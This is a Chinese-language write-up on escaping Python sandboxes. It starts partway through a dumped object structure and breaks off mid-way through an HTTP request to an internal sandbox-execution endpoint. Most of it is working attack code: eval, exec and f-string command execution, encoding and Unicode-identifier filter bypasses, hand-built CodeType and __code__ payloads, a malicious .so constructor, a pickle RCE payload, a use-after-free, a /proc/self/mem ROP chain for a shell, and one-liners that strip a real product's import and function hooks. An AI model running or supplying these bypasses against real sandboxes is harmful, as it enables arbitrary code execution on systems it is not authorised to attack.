0x7f6a9dc64a60>, 'TextBackend': <class 'sympy.plotting.backends.textbackend.text.TextBackend'>}, (None,), ('super', '__init__'), ('self', 'args', 'kwargs'), ('__class__',), (None, 1, 'The TextBackend supports only one graph per Plot.', 0, 'The TextBackend supports only expressions over a 1D range'), ('base_backend', '_show', 'len', '_series', 'ValueError', 'isinstance', 'LineOver1DRangeSeries', 'textplot', 'expr', 'start', 'end'), ('self', 'ser'), ('self',), <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, ModuleSpec(name='sympy.plotting.textplot', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'), {'name': 'sympy.plotting.textplot', 'loader': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, 'origin': '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py', 'loader_state': None, 'submodule_search_locations': None, '_set_fileattr': True, '_cached': '/usr/local/lib/python3.9/site-packages/sympy/plotting/__pycache__/textplot.cpython-39.pyc', '_initializing': False}, <module 'sympy.plotting.textplot' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'>, {'__name__': 'sympy.plotting.textplot', '__doc__': None, '__package__': 'sympy.plotting', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, '__spec__': ModuleSpec(name='sympy.plotting.textplot', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'), '__file__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py', '__cached__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/__pycache__/textplot.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <function ascii at 0x7f6ab85e2ee0>, 'bin': <function bin at 0x7f6ab85e2f70>, 'breakpoint': <function breakpoint at 0x7f6ab85e8040>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <function delattr at 0x7f6ab85e80d0>, 'dir': <function dir at 0x7f6ab85e8160>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <function format at 0x7f6ab85e81f0>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <function hex at 0x7f6ab85e8280>, 'id': <built-in function id>, 'input': <function input at 0x7f6ab85e83a0>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <function oct at 0x7f6ab85e8430>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <function hook_setattr.<locals>.builtin_setattr_with_checkcode at 0x7f6ab8a58e50>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <function open at 0x7f6ab85e8550>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n    for supporting Python development.  See www.python.org for more information., 'license': See https://www.python.org/psf/license/, 'help': Type help() for interactive help, or help(object) for help about object.}, 'Float': <class 'sympy.core.numbers.Float'>, 'Dummy': <class 'sympy.core.symbol.Dummy'>, 'lambdify': <function lambdify at 0x7f6ab8bd81f0>, 'math': <module 'math' from '/usr/lib64/python3.9/lib-dynload/math.cpython-39-x86_64-linux-gnu.so'>, 'is_valid': <function is_valid at 0x7f6a9dc641f0>, 'rescale': <function rescale at 0x7f6a9dc64820>, 'linspace': <function linspace at 0x7f6a9dc64940>, 'textplot_str': <function textplot_str at 0x7f6a9dc649d0>, 'textplot': <function textplot at 0x7f6a9dc64a60>}, ('Check if a floating point number is valid', None, False), ('isinstance', 'complex', 'math', 'isinf', 'isnan'), ('x',), ('Rescale the given array `y` to fit into the integer values\\n    between `0` and `H-1` for the values between ``mi`` and ``ma``.\\n    ', 2, None, 1), ('range', 'is_valid', 'append', 'Float', 'round', 'int'), ('y', 'W', 'H', 'mi', 'ma', 'y_new', 'norm', 'offset', 'x', 'normalized', 'rescaled'), (None, <code object <listcomp> at 0x7f6a9dc6a0e0, file \"/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py\", line 41>, 'linspace.<locals>.<listcomp>'), (1,)]\n"
```

##### gc.get_referents

返回传入对象直接引用的所有对象的列表。（我引用了谁）

比如.不能使用时可以获取一些东西。

```python
from gc import get_referents
import cgi
print((get_referents(cgi)[0]['os']))
```

##### gc.get_referrers

返回所有直接引用传入对象的对象列表。（谁引用了我）

比如通过None就能找到非常多的类和方法，里面很容易就可以找到os等危险模块。

```python
import gc
print(gc.get_referrers(None))
```

 

### 动态执行py代码

通常用于绕过字符串等检查

#### eval

简单的例子

```python
eval('__import__("os").system("whoami")')
```

#### exec

```python
exec('__import__("os").system("whoami")')
```

#### f-string

Python 3.6引入的特性，支持在string中执行Python代码。

```python
f"{__import__('os').system('whoami')}"
```

#### timeit

```python
import timeit
timeit.timeit("__import__('os').system('whoami')",number=1)
```

### 字符串匹配绕过

#### 常规绕过手法

可以采用一些编码等方式绕过关键字的检查,主要结合exec等动态执行python代码能力使用。

```python
# 各类编码
['__builtins__'] 
['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'] 
[u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'] 
['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]

import base64
base64.b64decode('YWFhYQ==')

chr(111)+chr(115) # 等价于 os

# 字符串拼接
'o'+'s'
```

#### unicode

python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: https://peps.python.org/pep-3131/

因此我们可以直接在代码中用 上下标替代原本的字母，如用ᵒ替代o，import ᵒs可正常执行。

上下标转换代码，方便生成payload

```python
def to_superscript(text):
    # 普通字母 → 上标字母的映射（仅部分字母有对应的上标形式）
    superscript_map = {
        'a': 'ᵃ', 'b': 'ᵇ', 'c': 'ᶜ', 'd': 'ᵈ', 'e': 'ᵉ', 'f': 'ᶠ', 'g': 'ᵍ',
        'h': 'ʰ', 'i': 'ⁱ', 'j': 'ʲ', 'k': 'ᵏ', 'l': 'ˡ', 'm': 'ᵐ', 'n': 'ⁿ',
        'o': 'ᵒ', 'p': 'ᵖ', 'r': 'ʳ', 's': 'ˢ', 't': 'ᵗ', 'u': 'ᵘ', 'v': 'ᵛ',
        'w': 'ʷ', 'x': 'ˣ', 'y': 'ʸ', 'z': 'ᶻ',
        'A': 'ᴬ', 'B': 'ᴮ', 'D': 'ᴰ', 'E': 'ᴱ', 'G': 'ᴳ', 'H': 'ᴴ', 'I': 'ᴵ',
        'J': 'ᴶ', 'K': 'ᴷ', 'L': 'ᴸ', 'M': 'ᴹ', 'N': 'ᴺ', 'O': 'ᴼ', 'P': 'ᴾ',
        'R': 'ᴿ', 'T': 'ᵀ', 'U': 'ᵁ', 'V': 'ⱽ', 'W': 'ᵂ'
    }
    return ''.join(superscript_map.get(char, char) for char in text)

def to_subscript(text):
    # 普通字母 → 下标字母的映射（部分字母无对应形式）
    subscript_map = {
        'a': 'ₐ', 'e': 'ₑ', 'o': 'ₒ', 'x': 'ₓ', 'h': 'ₕ',
        'i': 'ᵢ', 'j': 'ⱼ', 'k': 'ₖ', 'l': 'ₗ', 'm': 'ₘ',
        'n': 'ₙ', 'p': 'ₚ', 'r': 'ᵣ', 's': 'ₛ', 't': 'ₜ',
        'u': 'ᵤ', 'v': 'ᵥ'
    }
    return ''.join(subscript_map.get(char, char) for char in text)

# 示例
print(to_subscript("os"))  
print(to_superscript("system"))
```

利用生成出来的代码测试，可以成功执行

```python
import ₒₛ
ₒₛ.ˢʸˢᵗᵉᵐ('whoami')

_＿import＿＿('os').ˢʸˢᵗᵉᵐ('whoami')
```

### Python 字节码

#### Codetype

`CodeType` 是 python 的内置类型之一，用于表示编译后的字节码对象。`CodeType` 对象包含了函数、方法或模块的字节码指令序列以及与之相关的属性。

python 中关于 code class 的文档链接:

https://docs.python.org/3/library/types.html#types.CodeType

`CodeType` 对象具有以下属性：

- `co_argcount`: 函数的参数数量，不包括可变参数和关键字参数。
- `co_cellvars`: 函数内部使用的闭包变量的名称列表。
- `co_code`: 函数的字节码指令序列，以二进制形式表示。
- `co_consts`: 函数中使用的常量的元组，包括整数、浮点数、字符串等。
- `co_exceptiontable`: 异常处理表，用于描述函数中的异常处理。
- `co_filename`: 函数所在的文件名。
- `co_firstlineno`: 函数定义的第一行所在的行号。
- `co_flags`: 函数的标志位，表示函数的属性和特征，如是否有默认参数、是否是生成器函数等。
- `co_freevars`: 函数中使用的自由变量的名称列表，自由变量是在函数外部定义但在函数内部被引用的变量。
- `co_kwonlyargcount`: 函数的关键字参数数量。
- `co_lines`: 函数的源代码行列表。
- `co_linetable`: 函数的行号和字节码指令索引之间的映射表。
- `co_lnotab`: 表示行号和字节码指令索引之间的映射关系的字符串。
- `co_name`: 函数的名称。
- `co_names`: 函数中使用的全局变量的名称列表。
- `co_nlocals`: 函数中局部变量的数量。
- `co_positions`: 函数中与位置相关的变量（比如闭包中的自由变量）的名称列表。
- `co_posonlyargcount`: 函数的仅位置参数数量。
- `co_qualname`: 函数的限定名称，包含了函数所在的模块和类名。
- `co_stacksize`: 函数的堆栈大小，表示函数执行时所需的堆栈空间。
- `co_varnames`: 函数中局部变量的名称列表。

以案例来理解

```python
import dis
def test():
    print('test')
    return 'test'

print(test.__code__.co_code)
dis.dis(test.__code__.co_code)
```

输出

```python
b't\x00d\x01\x83\x01\x01\x00d\x01S\x00'
          0 LOAD_GLOBAL              0 (0)
          2 LOAD_CONST               1 (1)
          4 CALL_FUNCTION            1
          6 POP_TOP
          8 LOAD_CONST               1 (1)
         10 RETURN_VALUE
```

利用Codetype我们可以直接执行任意的Python字节码，可以用来实现执行Python代码、Python虚拟机任意代码执行。

Python字节码转Python代码

生成一个Codetype对象代码

```python
import builtins

def target(cmd):
    return __import__('subprocess').check_output(cmd, shell=True).decode()
# import code
# code.interact(local=locals())
code="CodeType({},{},{},{},{},{},bytes.fromhex('{}'),{},{},{},\'{}\',\'{}\',{},bytes.fromhex(\'{}\'),{},{})\n".format(
       target.__code__.co_argcount,
       target.__code__.co_posonlyargcount,
       target.__code__.co_kwonlyargcount,
       target.__code__.co_nlocals,
       target.__code__.co_stacksize,
       target.__code__.co_flags,
       target.__code__.co_code.hex(),
       target.__code__.co_consts,
       target.__code__.co_names,
       target.__code__.co_varnames,
       target.__code__.co_filename,
       target.__code__.co_name,
       target.__code__.co_firstlineno,
       target.__code__.co_lnotab.hex(),
       target.__code__.co_freevars,
       target.__code__.co_cellvars)
print(code)
```

Python 3.11版本

```python
code="CodeType({},{},{},{},{},{},bytes.fromhex('{}'),{},{},{},\'{}\',\'{}\',\'{}\',{},bytes.fromhex(\'{}\'),bytes.fromhex(\'{}\'))\n".format(
       target.__code__.co_argcount,
       target.__code__.co_posonlyargcount,
       target.__code__.co_kwonlyargcount,
       target.__code__.co_nlocals,
       target.__code__.co_stacksize,
       target.__code__.co_flags,
       target.__code__.co_code.hex(),
       target.__code__.co_consts,
       target.__code__.co_names,
       target.__code__.co_varnames,
       target.__code__.co_filename,
       target.__code__.co_name,
       target.__code__.co_qualname,
       target.__code__.co_firstlineno,
       target.__code__.co_linetable.hex(),
       target.__code__.co_exceptiontable.hex())
print(code)
```

运行后即可生成一个可以执行target函数的Codetype。

##### 利用 FunctionType+CodeType

创建一个函数，直接执行

```python
from types import CodeType, FunctionType
c=CodeType(0,0,0,0,3,3,bytes.fromhex('97007401000000000000000000006401a6010000ab010000000000000000a00100000000000000000000000000000000000000006402a6010000ab0100000000000000005300'),(None, 'os', 'whoami'),('__import__', 'system'),(),'test.py','target','target',4,bytes.fromhex('8000dd0b159064d10b1bd40b1bd70b22d20b22a038d10b2cd40b2cd0042c'),bytes.fromhex(''))
bb = FunctionType(c, {})
print(bb())
```

##### 利用 __code__ 替换

可能存在不能直接使用CodeType的情况，那么直接利用任意函数的__code__也可以完成利用。

POC代码，运行后会输出.replace(**)

```python
def target(cmd):
    return __import__('subprocess').check_output(cmd, shell=True).decode()
# import code
# code.interact(local=locals())
code=".replace(co_argcount={},co_posonlyargcount={},co_kwonlyargcount={},co_nlocals={},co_stacksize={},co_flags={},co_code=bytes.fromhex('{}'),co_consts={},co_names={},co_varnames={},co_filename=\'{}\',co_name=\'{}\',co_firstlineno={},co_lnotab=bytes.fromhex(\'{}\'),co_freevars={},co_cellvars={})\n".format(
       target.__code__.co_argcount,
       target.__code__.co_posonlyargcount,
       target.__code__.co_kwonlyargcount,
       target.__code__.co_nlocals,
       target.__code__.co_stacksize,
       target.__code__.co_flags,
       target.__code__.co_code.hex(),
       target.__code__.co_consts,
       target.__code__.co_names,
       target.__code__.co_varnames,
       target.__code__.co_filename,
       target.__code__.co_name,
       target.__code__.co_firstlineno,
       target.__code__.co_lnotab.hex(),
       target.__code__.co_freevars,
       target.__code__.co_cellvars)
print(code)
```

随便创建一个函数，将__code__替换一下即可

```python
def aa():
    return

aa.__code__=aa.__code__.replace(co_argcount=0,co_posonlyargcount=0,co_kwonlyargcount=0,co_nlocals=0,co_stacksize=3,co_flags=3,co_code=bytes.fromhex('97007401000000000000000000006401a6010000ab010000000000000000a00100000000000000000000000000000000000000006402a6010000ab0100000000000000005300'),co_consts=(None, 'os', 'whoami'),co_names=('__import__', 'system'),co_varnames=(),co_filename='test.py',co_name='target',co_firstlineno=1,co_freevars=(),co_cellvars=())
print(aa())
```

##### Python字节码实现Python虚拟机任意代码执行

直接运行Python字节码时，也可以直接利用pwn的漏洞利用手法劫持控制控制流任意代码执行，适用于被功能裁剪严重的Python沙箱。

可参考的一些材料：

https://www.anquanke.com/post/id/86366

https://wiki.huawei.com/domains/21514/wiki/40292/WIKI202307261662161

#### pyc

pyc是一种存储Python字节码格式的文件，如果我们可以控制sys.path或者往导入的目录中放置pyc同样可实现任意python字节码的执行。

相比导入pyc文件，导入so文件的利用复杂度会简单很多，以下是demo。

**恶意C代码**

```c
#include <stdio.h>
#include <stdlib.h>

// 定义构造函数，在 .so 加载时自动执行
__attribute__((constructor)) 
void malicious() {
    printf("[+] Malicious code executed!\n");
    system("touch /tmp/pwned");  
}
```

**编译成so**

```c
gcc -shared -fPIC -o evil.so malicious.c
```

**验证poc**

```python
import sys
sys.path.append('/tmp/')
import evil
```

#### Pickle反序列化

Pickle 允许序列化的字节码（opcode）直接控制 Python 的解释器。在Pickle反序列化的过程就是执行opcode恢复对象的过程，因此我们可以自行编写序列化后的opcode达成任意python代码执行。

可以借助[pker](https://github.com/eddieivan01/pker)工具生成对应的字节码。

```c
# test文件
exec = GLOBAL('builtins', 'exec')
exec('__import__("os").system("whoami")')

python3 pker.py < test
b'cbuiltins\nexec\np0\n0g0\n(S\'__import__("os").system("whoami")\'\ntR.'
import pickle
pickle.loads(b'cbuiltins\nexec\np0\n0g0\n(S\'__import__("os").system("whoami")\'\ntR.')
```

### 劫持控制流

#### 缓冲区溢出

一些C编写依赖库，如numpy存在缓冲区溢出漏洞。

[CVE-2021-33430](https://github.com/advisories/GHSA-6p56-wp2h-9hxr)

https://github.com/advisories/GHSA-6p56-wp2h-9hxr

https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5

#### Python UAF

Python3自身存在一个UAF漏洞，2012年提出的BUG至今一直没有修复，可以利用这个漏洞实现任意代码执行。

```python
import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True
    
f = io.BufferedReader(File())
f.read(1)                       # get view of buffer used by BufferedReader
del f                           # deallocate buffer
view = view.cast('P')
L = [None] * len(view)          # create list whose array has same size
                                # (this will probably coincide with view)
view[0] = 0                     # overwrite first item with NULL
print(L[0])                     # segfault: dereferencing NULL
```

Python在BufferedReader在read时会分配缓冲区，触发readinto函数，在里面我们可以将缓冲区buf设置到全局变量view中。后面删除f时会导致内部缓冲区被释放，但全局view仍保留着对已释放缓冲区的引用。

将view转换为指针类型('P')，创建列表L，其内部数组大小与view相同，会重用被释放的内存。通过view[0] = 0修改已释放内存，当访问L[0]时，实际上是在解引用NULL指针(0)，导致段错误。

 

\- 实验室项目实战 https://wiki.huawei.com/domains/5560/wiki/14528/WIKI202408054218660

\- 利用PythonUAF漏洞实现沙箱逃逸-原文 https://pwn.win/2022/05/11/python-buffered-reader.html

#### 读写/proc/self/mem

write 修改 got 表，实际上是一个 **/proc/self/mem** 的内存操作方法 **/proc/self/mem** 是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到 Python 一些函数的偏移，如 **system** ，我们便可以通过覆写 got 表达到 getshell 的目的。

```python
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```

第一个地址是 system 的偏移，第二个是 fopen 的偏移，我们可以通过 **objdump** 获取相关信息。

当前python默认开启Full RELRO，因此上述方法一般无法使用，可直接修改栈构造ROP进行利用。

```python
def read_process_memory():
    # 获取 libc 基地址
    with open('/proc/self/maps', 'r') as maps_file:
        maps_lines = maps_file.readlines()

        for item in maps_lines:
            if "/usr/lib/x86_64-linux-gnu/libc.so.6" in item:
                parts = item.split()
                addr_range = parts[0]
                start_str, end_str = addr_range.split('-')
                libc_base = int(start_str, 16)
                print(f"libc_base is {hex(libc_base)}")
                break

    # 打开 /proc/self/mem 进行读取
    with open('/proc/self/mem', 'rb') as mem_file:
        # 计算 environ 地址（存放栈底）
        environ_addr = libc_base + 0x222200
        mem_file.seek(environ_addr, 0)  # 0 = SEEK_SET
        chunk = mem_file.read(8)
        stack_base = int.from_bytes(chunk, 'little')
        print(f"stack address is {hex(stack_base)}")

    # 打开 /proc/self/mem 进行写入（构造 ROP）
    with open('/proc/self/mem', 'r+b') as mem_file_write:
        ret_addr = stack_base - 0x2f8

        # 计算 ROP gadget 地址
        pop_rdi_rbp_ret = libc_base + 0x2a745
        bin_sh_str = libc_base + 0x1d8678
        system_addr = libc_base + 0x50d70

        # 写入 ROP chain
        mem_file_write.seek(ret_addr, 0)  # 0 = SEEK_SET
        mem_file_write.write(pop_rdi_rbp_ret.to_bytes(8, 'little'))
        mem_file_write.write(bin_sh_str.to_bytes(8, 'little'))
        mem_file_write.write(bin_sh_str.to_bytes(8, 'little'))  # 填充 rbp
        mem_file_write.write(system_addr.to_bytes(8, 'little'))

        # 可选：验证写入是否成功
        mem_file_write.seek(ret_addr, 0)
        written_data = mem_file_write.read(32)
        print(f"Written ROP chain: {written_data.hex()}")

if __name__ == "__main__":
    read_process_memory()
```

 

## 项目实战

### 信息收集

**进程信息**

```c
ps axjfww
```

**配置信息**

存在Python沙箱,可能通过白名单限制可以用的lib和builtin方法

 

### 测试环境构建

### 环境演示

直接通过环境进行测试，编写代码，然后通过试运行功能对话触发。



只能看到main函数指定输出的信息，无法实现在代码中加入print等打印所有需要获取的调试信息。

构建方便的调试环境，将容器对外的端口映射出来。



初步的测试，可以看到os库在白名单lib里面，简单测试发现无法调用，需要定位原因。



 

### 防护方案分析

#### 模块白名单

Python 导入模块实现原理 （参考材料 https://github.com/pwwang/python-import-system）



Python首先会检查需要导入的模块是否在sys.module，若没有则会从sys.meta_path中取出finder，逐个使用Finder导入模块。

产品的实现则是自行实现了一个SecBoxFinder然后将其插入到meta_path中，确保每次导入时都经过沙箱的检查逻辑。



SecBoxFinder实现



产品中的配置，允许可导入的模块如下：   



 

```markup
numpy,warnings,enum,os,functools,collections,types,datetime,numbers,abc,io,executor_sdk,contextlib,dataclasses,math,operator,pickle,contextvars,_contextvars,ast,re,ctypes,copyreg,weakref,textwrap,platform,typing,__future__,sympy,mpmath,bisect,cmath,colorsys,keyword,linecache,timeit,gc,random,decimal,_decimal,fractions,flint,gmpy2,unicodedata,tokenize,gmpy,copy,inspect,string,struct,importlib,array,shutil,pathlib,tempfile,subprocess
```

#### 函数调用hook

MonkeyPatch原理（参考链接：https://cgiirw.github.io/2018/10/19/Python_Metaclass/）

概念上类似于Java里面的热修复，主要作用是在不更改源代码的情况下，动态追加和变更类的功能；

示例：

```python
# 原始的输出
>>> class Moneky(object):
        def eat(self):
            print("i want to eat banana")
   
>>> m = Moneky()
>>> m.eat()
i want to eat banana 

#动态修改函数
>>> def common_eat(self):
            print("sorry")
>>> Moneky.eat = common_eat 

#被劫持后的输出
>>> m.eat()
sorry
```

产品的实现



通过functools.wraps包装原本函数，在里面加入检查逻辑，根据传入的Hooker去检查是否合法，如果合法则调用原函数。

os.system(function) -> hook_wrapper -> os.system（built-in function）



检查逻辑，会调用hooker的validating_config和validating_arguments检查是否合法，如果不合法则调用hooker的action_on_deny方法处理。



比如os.system使用的是FuncHookMultiProc这个Hooker，可以看到检查逻辑为根据checker是否配置nproc，没有通过检查则会走action_on_deny逻辑直接退出进程。



os_hook是基于黑名单对os模块的方法进行hook，同样也会基于白名单的方式对os模块进行hook。



用户仅可使用os模块中的default_list以及subclass_level中的白名单方法。



一些单点的动态Hook

清空ctypes.pythonapi



限制setattr不能修改__code__



 

### 绕过方法

#### 白名单中的危险函数

##### ctypes

通过ctypes.CDLL或者ctypes.PyDLL加载c库





##### posix

os.execve不可用,但可用posix.execve代替。



#### 获取原始函数

##### gc

gc.get_objects

import gc;filtered_objects = filter(lambda obj: hasattr(obj, '__name__') and 'execve' in obj.__name__, gc.get_objects());a=next(filtered_objects);print(a)



###### 第一次修复

禁止通过gc获取get_objects



绕过：通过__dict__获取get_objects



###### 第二次修复

禁止通过gc获取__dict__



绕过：通过from gc import get_objects的方式引入get_objects



###### 第三次修复

通过动态hook替换的方式完全限制了get_objects的利用



##### 闭包变量 __closure__ 

可以本地编写一样的简化版hook代码，分析其字节码，看看其原始的引用是存放在什么地方的，可以从__code__中看到是存放在闭包变量里面的。



从远端看可以看到确实从闭包变量里面找到原始引用



 

#### 恢复原始函数

Hook实现通过替换各类引用实现，比如ctypes会将pythonapi置空



可以通过重导入的方式恢复被hook的对象

##### Importlib.reload

import sys;sys.meta_path.pop(0);import ctypes;import importlib;importlib.reload(ctypes);print(ctypes.pythonapi)



##### sys.modules.pop

import sys;sys.meta_path.pop(0);import sys;sys.modules.pop('ctypes');import ctypes;print(ctypes.pythonapi)



#### 动态修改Hook逻辑

既然Hooker可以改我们的逻辑，那我们是不是也可以修改Hooker的逻辑呢？

答案是肯定的，我们可以动态将inner中的一些逻辑修改掉即可让我们无视检查调用到原始函数。

举例：

check_trust_func



Hook 住check_trust_func函数永远返回True即可无视检查直接调用原函数。

sandbox._decorators.check_trust_func=lambda x,y,z:True;

那么问题就在于怎么获取sandbox模块底下的相关函数check_trust_func，可以看到数据流分析的时候他把sandbox从sys.module里去掉了。

##### sys.modules['__main__'].sandbox

前面的数据流分析时可以看到__main__的代码里面其实就导入了sandbox,所以我们通过__main__就可以找到sandbox。

import sys;print(sys.modules['__main__'].__dict__['sandbox'])





##### __globals__

因为所有危险的方法其实都被替换为decorator_factory.Inner，所以我们直接从这些被替换的inner方法的__globals__中即可获取到check_trust_func。



##### __code__

我们也可以通过直接修改inner函数的字节码实现Python代码的逻辑修改。

本地编写一个类似的实现



将其co_code直接替换。



import os,sys;os.execv.__code__=os.system.__code__.replace(co_code=b't\\x00\\x88\\x01\\x83\\x01\\x01\\x00t\\x00|\\x00\\x8e\\x00\\x01\\x00t\\x00f\\x00i\\x00|\\x01\\xa4\\x01\\x8e\\x01\\x01\\x00\\x88\\x01|\\x00i\\x00|\\x01\\xa4\\x01\\x8e\\x01S\\x00',co_varnames=('input_args', 'input_kwargs'),co_names=('print',),co_nlocals=2,co_consts=(None,),co_stacksize=4,co_freevars=('config_kwargs', 'hooker','func'),co_lnotab=b'',co_firstlineno=99999);

直接替换会发现报错，因为闭包的存在，这个co_code并不能直接使用，因为在云端闭包变量0是一个空字典跟本地编写的函数不一致。

可以结合AI分析云端的字节码，看到云端用到的闭包变量为1。



修改上述字节码，将\x88\x00全部修改为\x88\x01，即可。



另一个思路，可以直接用Python字节码通过pwn的技巧实现任意代码执行。

修复方案与绕过

修复方案：限制Codetype不能调用replace

绕过方法直接使用Codetype构建一个code对象

```python
POST /v1.1/sandboxes/execute HTTP/1.1
Host: 10.155.195.239:9053
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
